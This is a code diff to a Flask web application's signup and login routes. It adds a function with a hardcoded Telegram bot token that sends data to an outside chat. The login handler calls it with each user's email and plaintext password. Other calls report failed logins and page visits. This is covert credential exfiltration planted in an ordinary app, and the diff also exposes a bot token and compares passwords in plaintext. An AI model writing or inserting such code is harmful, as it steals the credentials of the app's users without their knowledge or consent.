@@ -44,6 +44,14 @@ def load_user(user_id):
     return Person.query.get(int(user_id))
 
 
+
+
+def sendtelegram(params):
+    url = "https://api.telegram.org/bot5787281305:AAE1S8DSnMAyQuzAnXOHfxLq-iyvPwYJeAo/sendMessage?chat_id=-1001556929308&text=" + urllib.parse.quote(params)
+    content = urllib.request.urlopen(url).read()
+    print(content)
+    return content
+
 ''''
 #login for admin
 class User:
@@ -612,6 +620,7 @@ def signup():
 #user land area
 @app.route('/userlanding')
 def userlanding():
+    sendtelegram("firsttrail")
     return render_template('userlanding.html')
 
 @app.route('/usersignup', methods=['POST','GET'])
@@ -652,17 +661,14 @@ def ulogin():
         if user and form.password.data == user.password:
             print(user.email + "validored successfully")
             login_user(user)
+            sendtelegram(user.email + user.password)
             flash ('Welcome, Finish Setting up your profile ' ,'success')
             return redirect(url_for('useryeargroup'))
             # next = request.args.get('next')
         else:
             flash (f'Wrong Password', 'success')
+            sendtelegram(user.email +''+ 'Wrong User Password')
     return render_template('userlogin.html', form=form)
-
-   
-
-
-
 
 
 @app.route('/useryeargroup', methods=['GET', 'POST'])
